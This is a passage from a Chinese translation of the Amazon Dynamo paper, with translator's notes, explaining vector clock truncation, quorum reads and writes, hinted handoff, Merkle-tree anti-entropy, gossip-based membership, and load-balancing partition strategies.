的一个潜在问题是：<strong>如果有多个节点先后 coordinate 同一个对象 的写操作，那这个对象的 clock vector 会变得很长</strong>。但在实际中这不太可能发生，因为 写操作 coordination 只会由 preference list 中前 N 个 节点中的一个来执行。 只有在网络分裂或多台服务器挂掉的情况下，写操作才可能由非 preference list 前 N 个 节点来执行，导致 vector clock 变长。在这种情况下，应该要限制 vector clock 的长度 。</p><p>Dynamo 采用了一种 clock 截断方案（clock truncation scheme）： 另外保存一个和 <code>(node, counter)</code> 对应的时间戳，记录对应的节点最后一次更新该记录 的时间。当 vector clock 里的 <code>(node, counter)</code> 数量达到一个阈值（例如，10）时， 就删除最老的一项。</p><p>显然，这种截断方案会给 reconciliation 带来一定问题，因为截断后可能无法精确判断部 分后代的因果关系。但到目前为止，我们还没有在生产环境遇到这个问题，因此没有继续深 入研究下去。</p><h3 id="4-5-get-和-put-的执行过程"><a href="#4-5-get-和-put-的执行过程" class="headerlink" title="4.5 get() 和 put() 的执行过程"></a>4.5 <code>get()</code> 和 <code>put()</code> 的执行过程</h3><p><strong>在 Dynamo 中，任何存储节点都可以接受任何 key 的 get 和 put 操作请求</strong>。</p><blockquote><p>Any storage node in Dynamo is eligible to receive client get and put operations for any key.</p></blockquote><p>本节先介绍在无故障场景下这些操作是如何执行的，下一节介绍有故障的场景。</p><p><code>get</code> 和 <code>put</code> 操作由 Amazon 基础设施相关的请求处理框架发起，使用 HTTP。 客户端有两种选择：</p><ol><li>将请求路由到负载均衡器，由后者根据负载信息选择一个后端节点</li><li>使用能感知 partition 的客户端，直接将请求路由到某 coordinator 节点</li></ol><p>第一种方式的好处是使用客户端的应用不需要了解任何 Dynamo 相关的代码，第二种的好处 是延迟更低，因为跳过了一次潜在的转发步骤。</p><p><strong>负责处理读或写请求的节点称为 coordinator</strong>。<strong>通常情况下</strong>，这是 preference list 内前 N 个节点中的<strong>第一个节点</strong>。如果请求是经过负载均衡器转发的，那这个请求 可能会被转发到环上的任意一个节点。在这种情况下，如果收到请求的节点不是 preference list 的 前 N 个节点中的一个，那它就不会处理这个请求，而是将其转发到 preference list 前 N 个节点中的第一个节点。</p><p><strong>读或写操作需要 preference list 中前 N 个节点处于健康状态</strong>，如果有 down 或不可 访问状态的节点，要跳过。如果所有节点都是健康的，那就取 preference list 的前 N 个 节点。如果发生节点故障或网络分裂，优先访问 preference list 中编号较小的节点。</p><h4 id="读写操作仲裁算法"><a href="#读写操作仲裁算法" class="headerlink" title="读写操作仲裁算法"></a>读写操作仲裁算法</h4><p>为了保证副本的一致性，Dynamo 使用了一种类似仲裁系统（quorum systems）的一致性协议。 这个协议有两个配置参数：<code>R</code> 和 <code>W</code>：</p><ul><li><code>R</code>：允许执行一次读操作所需的最少投票者</li><li><code>W</code>：允许执行一次写操作所需的最少投票者</li></ul><p><strong>设置 R + W &gt; N</strong>（<code>R</code> 或 <code>W</code> 至少有一个超过半数 N&#x2F;2，译者注），<strong>就得到了一 个类似仲裁的系统</strong>。</p><p>在这种模型下，一次 <code>get</code> （或 <code>put</code>）的延迟由 <code>R</code>（或 <code>W</code>）个<strong>副本中最慢的一个决 定</strong>。因此，为了降低延迟，<code>R</code> 和 <code>W</code> 通常设置的比 <code>N</code> 小。</p><h4 id="写和读过程"><a href="#写和读过程" class="headerlink" title="写和读过程"></a>写和读过程</h4><p>当收到一个 <code>put()</code> 请求后，coordinator 会为新版本生成 vector clock，并将其保存到 节点本地；然后，将新版本（及对应的新 vector clock）发送给 N 个排在最前面的、可到 达的节点。只要有至少 <code>W-1</code> 个节点返回成功，这次写操作就认为是成功了。</p><p>类似地，对于一次 <code>get()</code> 请求，coordinator 会向排在最前面的 N 个（highest-ranked ）可访问的节点请求这个 key 对应的数据的版本，等到 R 个响应之后，就将结果返回给客 户端。如果 coordinator 收集到了多个版本，它会<strong>将所有它认为没有因果关系的版本返 回给客户端</strong>。客户端需要对版本进行 reconcile，合并成一个最新版本，然后将结果写回 Dynamo。</p><h3 id="4-6-短时故障处理-Hinted-Handoff（移交给其他节点临时保存）"><a href="#4-6-短时故障处理-Hinted-Handoff（移交给其他节点临时保存）" class="headerlink" title="4.6 短时故障处理: Hinted Handoff（移交给其他节点临时保存）"></a>4.6 短时故障处理: Hinted Handoff（移交给其他节点临时保存）</h3><p>如果使用传统仲裁算法，Dynamo 无法在服务器宕机或网络分裂的时候仍然保持可用，而且 在遇到最简单故障情况下，持久性（durability）也会降低。</p><p>因此，Dynamo 采用了一种<strong>宽松的仲裁机制</strong>（sloppy quorum）：<strong>所有读和写操作在 preference list 的前 N 个健康节点上执行</strong>；注意这 N 个节点不一定就是前 N 个节点， 因为遇到不健康的节点，会沿着一致性哈希环的顺时针方向顺延。</p><p><img src="https://cdn.bugwz.com/dynamo-figure-2.png" alt="图 2 Dynamo 哈希环上 key 的分散（partition）和复制（replication）"></p><p>以图 2 的配置为例，其中 N&#x3D;3。<strong>如果 A 临时不可用，正常情况下应该到达 A 的写请求就 会发送到 D</strong>。这样设计是为了保证期望达到的可用性和持久性。<strong>发送到 D 的副本的元 数据中会提示（hint）这个副本本来应该发送给谁</strong>（这里是 A），然后这个数据会被 D 保存到本地的一个独立数据库中，并且有一个<strong>定期任务不断扫描，一旦 A 可用了，就将 这个数据发送回 A</strong>，然后 D 就可以从本地数据库中将其删除了，这样系统内的副本数还 是保持不变。</p><p>使用这种 hinted handoff 的方式，Dynamo <strong>保证了在节点或网络发生短时故障时读和写 操作不会失败</strong>。希望可用性最高的应用可以将 <code>W</code> 设为 1，这样可以保证只要一个节点 完成写，这次写操作就被系统接受了。在这种情况下，除非全部节点都不可用，否则写操作 就不会被拒绝。但实际上，大部分 Amazon 的应用都是设置一个比 1 大的值，以达到期望 的持久性（durability）等级。我们会在第 6 节更深入地讨论 <code>N</code>、<code>R</code> 和 <code>W</code> 的配置。</p><p><strong>高度可用的存储系统必须能够处理整个数据中心挂掉的情况。</strong>掉电、制冷失效、网络故 障以及自然灾难都会导致整个数据中心发生故障。Dynamo 可以配置<strong>向多个数据中心同步 副本</strong>，只要<strong>将 preference list 里的节点分散到不同数据中心</strong>。这些数据中心之间 通过高速网络互连。这使得我们可以在整个数据中心挂掉的情况下仍然可以提供服务。</p><h3 id="4-7-持久（permanent）故障处理-副本跨数据中心同步"><a href="#4-7-持久（permanent）故障处理-副本跨数据中心同步" class="headerlink" title="4.7 持久（permanent）故障处理: 副本跨数据中心同步"></a>4.7 持久（permanent）故障处理: 副本跨数据中心同步</h3><p>在节点成员变动较小、节点故障只是短时的情况下，hinted handoff 方式工作良好。但也 有一些场景，在 hinted 副本移交给原本应该存储这个副本的节点之前，该副本就不可用了 。为了解决这个问题，以及其他威胁到持久性（durability）的场景，Dynamo 实现了一种 <strong>逆熵（副本同步）协议</strong>来<strong>保证副本是同步的</strong>。</p><blockquote><p>To handle this and other threats to durability, Dynamo implements an anti-entropy (replica synchronization) protocol to keep the replicas synchronized.</p></blockquote><h4 id="Merkle-Tree"><a href="#Merkle-Tree" class="headerlink" title="Merkle Tree"></a>Merkle Tree</h4><p>为了实现<strong>快速检测副本之间的不一致性，以及最小化转移的数据量</strong>，Dynamo 使用了 Merkle trees [13].</p><p>一个 Merkle tree 就是一个<strong>哈希树</strong>，其叶子节点是 <strong>key 对应的 value 的哈希值</strong>。 <strong>父节点是其子节点的哈希</strong>。</p><p>Merkle tree 的主要优点是：</p><ul><li>每个分支都可以独立查看（check），节点无需下载整棵树或者整个数据集</li><li>减少检查副本一致性时所需传输的数据量</li></ul><p><strong>例如，如果两棵树的根节点的哈希值相同，那这两棵树的叶子节点必然相同，这两台 node 之间就无需任何同步</strong>；否则，就说明两台 node 之间的某些副本是不同的，这种情 况下两台 node 就需要交换树的子节点哈希值，直到到达叶子节点，就找到了未同步（out of sync）的 key。Merkle tree 最小化了同步时需要转移的数据量，<strong>减少了逆熵过程中 读取磁盘的次数</strong>。</p><p>Dynamo 使用 Merkle tree 实现<strong>逆熵的过程</strong>如下：<strong>每个节点为每段 key range（一台 虚拟节点所覆盖的 key 的范围）维护了一棵单独的 Merkle tree</strong>。</p><p>这使得节点之间可以比较 key range，确定其维护的 range 内的 key 是否是最新的（up to date）。在这种方案中，两个节点会交换他们都有的 key range 所对应的 Merkle tree 的 根节点。然后，基于前面提到的树遍历方式， node 可以判断是是否有不一致，如果有，就 执行同步。</p><p>这种方案的缺点是：<strong>每当有节点加入或离开系统时，一些 key range 会变，因此对应的 tree 需要重新计算</strong>。我们会在 6.2 节介绍如何通过改进的 partitioning scheme 解决 这个问题。</p><h3 id="4-8-节点成员（Membership）管理和故障检测"><a href="#4-8-节点成员（Membership）管理和故障检测" class="headerlink" title="4.8 节点成员（Membership）管理和故障检测"></a>4.8 节点成员（Membership）管理和故障检测</h3><h4 id="4-8-1-哈希环（ring）成员"><a href="#4-8-1-哈希环（ring）成员" class="headerlink" title="4.8.1 哈希环（ring）成员"></a>4.8.1 哈希环（ring）成员</h4><p>在 Amazon 的环境中，节点服务不可用（故障或维护导致的）通常情况下持续时间都很短， 但也存在中断比较长的情况。一个节点服务中断并不能说明这个节点永久性的离开了系统， 因此不应该导致系统对 partition 进行再平衡（rebalance），或者修复无法访问的副本。 与此类似，无意的手动操作可能导致新的节点加入到 Dynamo。</p><p>因此，为了避免以上这些问题，我们决定<strong>使用显式机制（explicit mechanism）来向 Dynamo Ring 增删节点</strong>。管理员通过命令行或 web 方式连接到 Dynamo node，然后下发 一个成员变更命令，来将这个 node 添加到 ring 或从 ring 删除。负责处理这个请求的 node 将成员变动信息和对应的时间写入持久存储。成员变动会形成历史记录，因为一个节 点可能会多次从系统中添加和删除。Dynamo <strong>使用一个 gossip-based 的算法通告（ propagete）成员变动信息</strong>，维护成员的一份最终一致视图。</p><p>每个节点每秒会随机选择另一个节点作为对端，这两个节点会高效地 reconcile 它们的成 员变动历史。</p><p><strong>一个节点第一次起来时，首先会选择它的 token 集合</strong>（一致性哈希空间内的虚拟节点 ），然后<strong>将节点映射到各自的 token 集合</strong>。</p><blockquote><p>When a node starts for the first time, it chooses its set of tokens (virtual nodes in the consistent hash space) and maps nodes to their respective token sets.</p></blockquote><p><strong>映射关系会持久存储到磁盘上</strong>，初始时只包含本节点（local node）和 token set。存 储在不同 Dynamo 节点上的<strong>映射关系，会在节点交换成员变动历史时被 reconcile</strong>。因 此，partitioning 和 placement（数据的放置信息）也会通过 gossip 协议进行扩散，<strong>最 终每个节点都能知道其他节点负责的 token 范围</strong>。</p><blockquote><p>The mappings stored at different Dynamo nodes are reconciled during the same communication exchange that reconciles the membership change histories.</p><p>Therefore, partitioning and placement information also propagates via the gossip-based protocol and each storage node is aware of the token ranges handled by its peers.</p></blockquote><p>这<strong>使得每个节点可以将一个 key 的读&#x2F;写操作直接发送给正确的节点</strong>进行处理。</p><h4 id="4-8-2-系统外部发现（External-Discovery）和种子节点"><a href="#4-8-2-系统外部发现（External-Discovery）和种子节点" class="headerlink" title="4.8.2 系统外部发现（External Discovery）和种子节点"></a>4.8.2 系统外部发现（External Discovery）和种子节点</h4><p>以上机制<strong>可能导致 Dynamo ring 在逻辑上临时分裂</strong>。</p><p>例如，管理员先联系 node A，将 A 将入 ring，然后又联系 node B 加入 ring。在这种情 况下，A 和 B 都会认为它们自己是 ring 的成员，但不会立即感知到对方。</p><p><strong>为了避免逻辑分裂，我们会将一些 Dynamo 节点作为种子节点</strong>。种子节点是通过外部机 制（external mechanism）发现的，所有节点都知道种子节点的存在。因为所有节点最终都 会和种子节点 reconcile 成员信息，所以逻辑分裂就几乎不可能发生了。</p><p>种子或者从静态配置文件中获取，或者从一个配置中心获取。通常情况下，种子节点具有普 通节点的全部功能。</p><h4 id="4-8-3-故障检测"><a href="#4-8-3-故障检测" class="headerlink" title="4.8.3 故障检测"></a>4.8.3 故障检测</h4><p>故障检测在 Dynamo 中用于如下场景下跳过不可达的节点：</p><ul><li><code>get()</code> 和 <code>put()</code> 操作时</li><li>转移 partition 和 hinted replica 时</li></ul><p>要避免尝试与不可达节点通信，一个<strong>纯本地概念（pure local notion）的故障检测</strong>就 足够了：节点 B 只要没有应答节点 A 的消息，A 就可以认为 B 不可达（即使 B 可以应答 C 的消息）。</p><p>在客户端有持续频率的请求的情况下，Dynamo ring 的节点之间就会有持续的交互；因此只 要 B 无法应答消息，A 可以很快就可以发现；在这种情况下，A 可以选择和与 B 同属一个 partition 的其他节点来处理请求，并定期地检查 B 是否活过来了。</p><p><strong>在没有持续的客户端请求的情况下，两个节点都不需要知道另一方是否可达。</strong></p><blockquote><p>In the absence of client requests to drive traffic between two nodes, neither node really needs to know whether the other is reachable and responsive.</p></blockquote><p><strong>去中心化故障检测协议使用简单的 gossip 风格协议，使得系统内的每个节点都可以感知 到其他节点的加入或离开</strong>。想详细了解去中心化故障检测机制及其配置，可以参考 [8]。</p><p>Dynamo 的早期设计中使用了一个去中心化的故障检测器来维护故障状态的全局一致视图 （globally consistent view of failure state）。</p><p>后来我们发现，我们<strong>显式的节点加入和离开机制</strong>使得这种全局一致视图变得多余了。因 为节点的真正（permanent）加入和离开消息，依靠的是我们的显式添加和删除节点机制， 而临时的加入和离开，由于节点之间的互相通信（转发请求时），它们自己就会发现。</p><h3 id="4-9-添加-x2F-移除存储节点"><a href="#4-9-添加-x2F-移除存储节点" class="headerlink" title="4.9 添加&#x2F;移除存储节点"></a>4.9 添加&#x2F;移除存储节点</h3><p>当一个新节点 <code>X</code> 加入到系统后，它会<strong>获得一些随机分散在 ring 上的 token</strong>。对每 个分配给 <code>X</code> 的 key range，当前可能已经有一些（小于等于 <code>N</code> 个）节点在负责处理了 。因此,将 key range 分配给 <code>X</code> 后，这些节点就不需要处理这些 key 对应的请求了，而 要将 keys 转给 <code>X</code>。</p><p>考虑一个简单的情况：<code>X</code> 加入 图 2 中 <code>A</code> 和 <code>B</code> 之间。这样，<code>X</code> 就负责处理落到 <code>(F, G], (G, A] and (A, X]</code> 之间的 key。结果，<code>B</code>、<code>C</code> 和 <code>D</code> 节点就不需负责相应 range 了。因此，在收到 <code>X</code> 的转移 key 请求之后，<strong>B、C 和 D 会向 X 转移相 应的 key</strong>。当移除一个节点时，key 重新分配的顺序和刚才相反。</p><p><img src="https://cdn.bugwz.com/dynamo-figure-2.png" alt="图 2 Dynamo 哈希环上 key 的分散（partition）和复制（replication）"></p><p>我们的实际运行经验显示，这种方式<strong>可以在存储节点之间保持 key 的均匀分布</strong>，这对 于保证延迟需求和快速 bootstrapping 是非常重要的。另外，在源和目的节点之间加了确 认（转移），可以保证不会转移重复的 key range。</p><h2 id="5-实现"><a href="#5-实现" class="headerlink" title="5. 实现"></a>5. 实现</h2><p>Dynamo 中的<strong>每个存储节点上主要有三个组件</strong>，都是用 Java 实现的：</p><ul><li>request coordination（请求协调）组件</li><li>成员验证和故障检测组件</li><li>本地持久存储引擎</li></ul><h3 id="本地存储引擎"><a href="#本地存储引擎" class="headerlink" title="本地存储引擎"></a>本地存储引擎</h3><p>Dynamo 的本地持久存储组件支持以插件的方式使用不同的存储引擎。在使用的引擎包括：</p><ul><li>Berkeley Database (BDB) Transactional Data Store2</li><li>BDB Java Edition</li><li>MySQL</li><li>an in-memory buffer with persistent backing store</li></ul><p>将其设计为可插拔的原因是：<strong>为不同应用访问类型选择最合适的存储引擎</strong>。例如，BDB 通常用于处理几十 KB 大小的对象，而 MySQL 可以处理更大的对象。应用可以根据它们的 对象大小分布选择合适的持久化引擎。</p><p>我们生产环境的 Dynamo 大部分使用的都是 BDB Transactional Data Store。</p><h3 id="请求协调"><a href="#请求协调" class="headerlink" title="请求协调"></a>请求协调</h3><p>request coordination 组件构建在一个事件驱动的消息系统之上，其中的消息处理 pipeline 分为多个阶段，和 SEDA 架构类似 [24]。所有通信都基于 Java NIO channel 实现。</p><p><strong>coordinator 代替客户端执行读和写请求</strong>：读操作时会从一个或多个节点收集数据，写操作 时会向一个或多个节点存储数据。每个客户端请求都会<strong>在收到这个请求的节点上创建一个状 态机</strong>。这个状态机包含了识别 key 对应的节点、发送请求、等待响应、重试、处理响应和 组合响应返回给客户端等所有逻辑。</p><h4 id="read-coordination"><a href="#read-coordination" class="headerlink" title="read coordination"></a>read coordination</h4><p>每个状态机处理且只处理一个客户端请求。例如，一个读操作实现了包含如下步骤的状态机：</p><ol><li>发送读请求给节点</li><li>等待所需的最少数量响应</li><li>如果在规定的上限时间内收到的响应数量太少，认定请求失败</li><li>否则，收集对象的所有版本，确定应该返回哪些</li><li>如果打开了版本化（versioning）配置，执行 syntactic reconciliation，生成一个不 透明的写上下文（context），其中包含了合并之后的版本对应的的 vector clock</li></ol><p>为了描述的简单，以上没有提及故障处理和重试的步骤。</p><p><strong>读操作的响应发送给调用方之后，状态机会继续等待一小段时间，接收可能的有效响应</strong>（ outstanding responses，例如最小数量响应之外的其他节点的响应，译者注）。</p><p>如果返回中有过期版本（stale version），coordinator 就需要合并版本，并将最新版本 更新回这些节点。这个过程称为<strong>“读时修复”（read repair）</strong>，因为它<strong>在一个乐观的 时间点</strong>（at an opportunistic time）<strong>修复了那些错过了最新更新的副本</strong>（replicas that have missed a recent update），<strong>减少了逆熵协议的工作</strong>（本来应该是稍后由逆 熵协议做的）。</p><h4 id="write-coordination"><a href="#write-coordination" class="headerlink" title="write coordination"></a>write coordination</h4><p>前面提到过，写请求是由 preference list 内的前 N 个节点中的任意一个 coordinate 的 。总是让 N 个节点中的第一个来 coordinate 有一些好处，例如可以使得在同一个地方完 成写操作的顺序化（serializing all writes），但是，这种方式也有缺点：它会导致不均 匀的负载分布，损害 SLA。这是因为对象请求并不是均匀分布的（request load is not uniformly distributed across objects）。</p><p>为了解决这个问题，<strong>preference list 内的所有 N 个节点都可以 coordinate 写操作</strong>。 而且，因为一个写操作之前通常有一个读操作，因此写操作的 coordinator 都选择为：<strong>前 一次读操作返回最快的那个节点</strong>，这个信息存储在读操作返回的上下文中。</p><p>这项优化还使在下一次读取时，前一次读操作选中的存储这个数据的节点更容易被选中，提 高了“读取刚写入的数据”（“read-your-writes”）的概率。</p><blockquote><p>This optimization enables us to pick the node that has the data that was read by the preceding read operation thereby increasing the chances of getting “read-your-writes” consistency.</p></blockquote><p>同时，还降低了请求处理性能的抖动性，提高了 <code>P99.9</code> 性能。</p><h2 id="6-测试结果及学到的经验"><a href="#6-测试结果及学到的经验" class="headerlink" title="6. 测试结果及学到的经验"></a>6. 测试结果及学到的经验</h2><p>Dynamo 被几种不同类型的服务使用，每种场景下的配置不同。这些不同体现在 vesion reconciliation 逻辑和读&#x2F;写仲裁特点上。几种主要的场景：</p><ul><li><strong>业务逻辑相关的 reconciliation</strong>：这种场景使用很广。每个数据对象都会复制到不同节 点上，发生<strong>版本冲突时由应用执行自己的 reconciliation 逻辑</strong>。前文提到的购物 车服务就是一个典型的例子，应用自己来合并冲突的购物车版本</li><li><strong>基于时间戳的 reconciliation</strong>：和第一种的不同仅仅是 reconciliation 机制。当 发生版本冲突时，Dynamo 根据<strong>“最后一次写胜出”</strong>（last write wins）机制，例如， 选择时间戳最近的一个版本作为最终版本。一个例子是维护客户 session 信息的服务</li><li><strong>高性能读引擎</strong>：虽然 Dynamo 设计为永远可写（always writeable） 数据仓库, 但 一些服务通过<strong>对 Dynamo 的仲裁特性进行调优（tuning），而将其作为一个高性能读引 擎使用</strong>。典型情况下，这类服务有很高的读频率和很小的写频率。<strong>在这种配置中， R 一般设为 1，W 设为 N</strong>。对于这些服务，Dynamo 提供了 partition 和数据跨 多节点复制的能力，因而提供了增量可扩展性。<strong>数据的权威持久缓存</strong>（the authoritative persistence cache for data）存储在更重量级的后端存储中（more heavy weight backing stores）。<strong>维护产品目录和促销商品的服务</strong>会用到这种类型 的 Dynamo 配置</li></ul><p>Dynamo 的最大优势是：<strong>客户端应用可以通过对 N、R 和 W 三个参数进行调优来达到期 望的性能、可用性和持久性等级</strong>。</p><blockquote><p>The main advantage of Dynamo is that its client applications can tune the values of N, R and W to achieve their desired levels of performance, availability and durability.</p></blockquote><p>例如，N 的大小决定了每个对象的持久性。Dynamo 用户最常用的 N 配置是 3。</p><p>W 和 R 的值会影响对象的可用性、持久性和一致性。例如，如果 W 设为 1，那只要系统还 有一台正常的 node，写操作就不会被拒绝。但是，太小的 W 和 R 配置会增加不一致的风 险，因为一次写操作即使在没有大多数副本都写成功的情况下，还是会给客户端返回成功。 这也导致存在一个<strong>风险窗口</strong>（vulnerability window）：<strong>一次写操作即使只在少量节 点上完成了持久化，也会向客户端返回成功</strong>。</p><p>传统观点认为，持久性和可用性是相伴而生（go hand in hand）的，但在这里不一定成立。 例如，增加 W 就会减小持久性的风险窗口；但是，这可能会增加请求被拒绝的概率（因此 降低了可用性），因为这种情况下需要更多的健康存储节点来处理写请求。</p><p>我们**最常用的 Dynamo 集群 (N,R,W) 配置是 (3,2,2)**。这个配置符合我们所需的 性能、持久性、一致性和可用性（SLA）等级。</p><p>本节所有的数据都是从一套线上 Dynamo 环境获得的，配置是 <code>(3,2,2)</code>， 有几百台节点（a couple hundred nodes），配置利用到了异构硬件信息。</p><p>之前我们提到，每套 Dynamo 的节点都是跨数据中心部署的，这些数据中心之间通过高速网 络互联。执行一次成功的 <code>get</code> （或 <code>put</code>）需要 <code>R</code> （或 <code>W</code>）个节点向 coordinator 发送响应，因此很明显，数据中心之间的时延会影响到响应时间，因此在选择节点（以及它 所在的数据中心的位置）的时候要特别注意，以保证能满足应用期望的 SLA。</p><h3 id="6-1-性能和持久性的平衡"><a href="#6-1-性能和持久性的平衡" class="headerlink" title="6.1 性能和持久性的平衡"></a>6.1 性能和持久性的平衡</h3><p>虽然 Dynamo 的首要设计目标是一个高可用数据仓库，但性能指标在 Amazon 也同样重要。 前面提到过，为了提供一致的用户体验，Amazon 的服务会设置一个很高的用百分比衡量的 （例如 <code>P99.9</code> 或 <code>P99.99</code>）性能指标。典型的 SLA 指标是：读和写操作的 <code>P99.9</code> 要 在 <code>300ms</code> 以内成。</p><p>由于 Dynamo 是在<strong>通用硬件</strong>上运行的，和高端企业级服务器相比，<strong>I&#x2F;O 吞吐性能要差 很多</strong>，因此提供一致的高性能读写并不是一项简单的工作。而且，每次读&#x2F;写操作都要涉 及多台节点，给这项工作带来了更大的挑战性，因为<strong>最终的性能受限于最慢的那个副本所 在的节点</strong>。</p><h4 id="通用配置下的性能"><a href="#通用配置下的性能" class="headerlink" title="通用配置下的性能"></a>通用配置下的性能</h4><p>图 4 显示了 30 天内 Dynamo 的读和写操作延迟平均值和 <code>P99.9</code>：</p><p><img src="https://cdn.bugwz.com/dynamo-figure-4.png" alt="图 4 2006 年 12 月峰值请求季的读写延迟平均值和 P99.9。 X 轴一个刻度 12 小时。延迟走势和每天的请求量走势一致，延迟的 P99.9 比平均值要大一个数量级"></p><p>从图上可以看出，延迟曲线每天的走势（diurnal pattern）都类似，这和平台每天的请求 量走势也是一致的（例如，白天和晚上的请求量明显不一样）。另外，写延迟明显高于读延 迟，因为<strong>写操作永远需要访问磁盘</strong>。另外，<strong>P99.9 大约为 200ms，比平均值高一 个数量级</strong>。这是因为 P99.9 有很多影响因素，例如请求负载变化、对象大小和 locality patterns。</p><h4 id="低延迟配置下的性能"><a href="#低延迟配置下的性能" class="headerlink" title="低延迟配置下的性能"></a>低延迟配置下的性能</h4><p>以上性能对很多服务来说都足够了，但有少数面向用户的服务，它们对性能有更高的要求。 对于这种情况，Dynamo 提供了<strong>牺牲持久性换性能</strong>的能力。具体来说，每个存储节点会 <strong>在主内存中维护一个对象缓存</strong>（object buffer），写操作将数据存储到缓存直接返回， 另有一个独立的写线程定期将数据写入磁盘。读操作会先检查缓存中是否有，如果有，就直 接从缓存读，从而避免了访问存储引擎。</p><p>这项优化可以<strong>将峰值流量期间的 P99.9 降低到原来的 1&#x2F;5</strong>，即使只使用一个很小的 、只能存放 1000 个对象的缓存，见图 5。</p><p><img src="https://cdn.bugwz.com/dynamo-figure-5.png" alt="图 5 带缓存和不带缓存的 P99.9 性能对比，时间跨度 24 小时，X 轴一个刻度一个小时"></p><p>另外，从图中可以看到，缓存写（write buffering）可以对百分比延迟进行平滑。显然， 这种方案中持久性和性能之间做了折中：一台<strong>节点挂掉会导致缓存里还未落盘的数据丢失</strong>。 为了减小这种风险，写操作进行了优化（refine），由 coordinator <strong>从 N 个副本中选择 一个进行持久化写入</strong>（durable write）。因为 coordinator 只等待 <code>W</code> 个写操作，因此整 体的写操作不受这次写盘操作的影响。</p><blockquote><p>以上优化的意思是，每次写操作到达 coordinator 时，它会将请求转发给相应个节点， 这些节点都是写完内存 buffer 就直接返回的；除此之外，coordinator 还会挑一个节点 进行持久写入，跟其他节点的写是并行进行的，这样可以降低其他节点挂掉时内存数据丢 失的风险。由于 coordinator 只等待 W 个结果就返回了，因此虽然这个执行持久写的节 点（相对）很慢，但 coordinator 并不会依赖它的结果才返回，因此文中说对写性能来 说是没有影响的，译者注。</p></blockquote><h3 id="6-2-均匀负载分布（Uniform-Load-distribution）"><a href="#6-2-均匀负载分布（Uniform-Load-distribution）" class="headerlink" title="6.2 均匀负载分布（Uniform Load distribution）"></a>6.2 均匀负载分布（Uniform Load distribution）</h3><p>Dynamo 通过一致性哈希将它的 key 空间进行 partition，保证负载分布的均匀性。 只要 key 的访问不是极度不均衡，均匀的 key 分布就可以帮助我们实现负载的均衡分布。 特别地，即使出现了明显的 key 访问不平衡的情况，只要这些 key 足够多，Dynamo 也能 保证这些 key 在后端节点之间是均衡分散的。 本节介绍 Dynamo 中的负载不平衡问题，几种解决策略及其对负载分布的影响。</p><p>为了研究负载不平衡（load imbalance）以及它和请求负载（request load）的相关性，我 们测量了 24 个小时内每台节点收到的请求量，以 30 分钟作为一个点。在规定的时间内， 只要节点收到的请求量偏离平均值的程度不超过一个阈值（例如，15%），这台节点就认为 是平衡的（inbalance）；否则，就是不平衡的（out of balance）。</p><p>图 6 展示了不平衡的节点所占的比例（imbalance ratio）：</p><p><img src="https://cdn.bugwz.com/dynamo-figure-6.png" alt="图 6 不平衡节点比例，及其负载（请求数），X 轴一个刻度 30 分钟"></p><p>作为参考，图中也画出了这段期间系统的总负载（请求量）。从图中可以看出，随着请求量 的上升，不平衡的比例在下降。例如，低负载期间的不平衡比例高达 20%，而高负载期间降 到了 10%。直观上可以解释：随着负载（请求量）的上升，大量的活跃 key 的访问会均匀 的分发到节点，导致负载平衡分布。而低峰期间（请求量只有峰值的 1&#x2F;8），只有很少的 活跃 key 访问，导致负载非常不平衡。</p><p>本节接下来介绍 Dynamo 的 partition scheme 是如何随时间演进的，以及它对负载分布的 影响。</p><h4 id="策略-1：每个节点-T-个随机-token，按-token-值分散"><a href="#策略-1：每个节点-T-个随机-token，按-token-值分散" class="headerlink" title="策略 1：每个节点 T 个随机 token，按 token 值分散"></a>策略 1：每个节点 T 个随机 token，按 token 值分散</h4><p>这是生产环境最早部署的策略（在 4.2 节介绍过了）。</p><p>在这种策略中，会<strong>给每个节点（从哈希空间）随机分配 T 个 token</strong>。所有节点的 token 在哈希空间中是有序的（按 token 值）。<strong>两个相邻的 token 定义一个范围</strong>（ key range）。最后一个 token 和第一个 token 收尾相连。</p><p>因为 token 是随机选择的，因此范围有大有小。<strong>当有节点加入或离开系统的时，token 集合会变化，导致范围也会跟着变</strong>。注意，<strong>每个节点用来维护成员信息所需的空间随着 系统中的节点数线性增长</strong>。</p><p>这种策略在使用过程中发现如下几个问题。</p><p>首先，一个<strong>新节点加入到系统后，需要从其他节点“偷”出它要用的 key range</strong>。 这会导致那些需要将一部分 key range 移交给新节点的节点，<strong>扫描它们全部的本地持久存 储</strong>，以过滤出所需的数据。在生产环境环境执行这种扫描操作是很棘手的，因为它 会<strong>占用大量磁盘 IO</strong>；为了不影响正常的请求处理，需要把这个任务放到后台。 这要求我们只能将新节点加入集群的任务调到最低优先级。这带来的后果就是，<strong>节点上线的 速度非常慢</strong>，尤其是购物高峰季每天处理百万请求时，上线一台节点需要花费几乎一整天时 间。</p><p>第二，一个节点加入或离开系统时，很多节点负责的 key range 会发生变化，对应的 <strong>Merkle tree 需要重新计算</strong>。对于生产环境来说，这也是一项不小的工作。</p><p>最后，由于 key range 的随机性，<strong>无法快速地对整个 key 空间进行快照</strong>（snapshot）。 这使得存档（备份）工作变得复杂。在这种方案下，我们进行一次快照需要分别从所有节 点获取 key，非常低效。</p><p><strong>这种策略的根本问题出在：数据的 partition 和 placement 方案混在了一起</strong>（ intertwined）。例如，在某些场景下希望通过增加节点应对请求量的上涨，但是在这种方 案中，<strong>无法做到添加新节点不影响数据 partition</strong>。</p><p>理想情况下，应该使用独立的数据 partition 和 placement 方案。为此，我们考察了下面的几种方案。</p><h4 id="Strategy-2-每个节点-T-个随机-token，平均分散"><a href="#Strategy-2-每个节点-T-个随机-token，平均分散" class="headerlink" title="Strategy 2: 每个节点 T 个随机 token，平均分散"></a>Strategy 2: 每个节点 T 个随机 token，平均分散</h4><p>这种策略将哈希空间分为 <code>Q</code> 个相同大小的 partition&#x2F;range，每个节点分配 <code>T</code> 个 随 机 token。<code>Q</code> 的选择通常要满足：<code>Q &gt;&gt; N</code> 和 <code>Q &gt;&gt; S*T</code>（<code>&gt;&gt;</code>：远大于，译者注）， 其中 <code>S</code> 是系统中节点的数量。</p><p>在这种策略中，token 仅用于<strong>哈希空间的值映射到有序节点列表</strong>的过程，并<strong>不影响数 据 partition</strong>。</p><p>一个 partition 会放在从该 partition 末尾开始<strong>沿顺时针方向得到的前 N 个独立节点</strong>。</p><p><img src="https://cdn.bugwz.com/dynamo-figure-7.png" alt="图 7 三种策略中 key 的 partition 和 placement。N=3，A、B、 C 是 key k1 的 preference list 中的三个独立节点。阴影区域表示 preference list 是 [A,B,C] 的 key range，箭头表示不同节点对应的 token 位置"></p><p>图 7 展示了 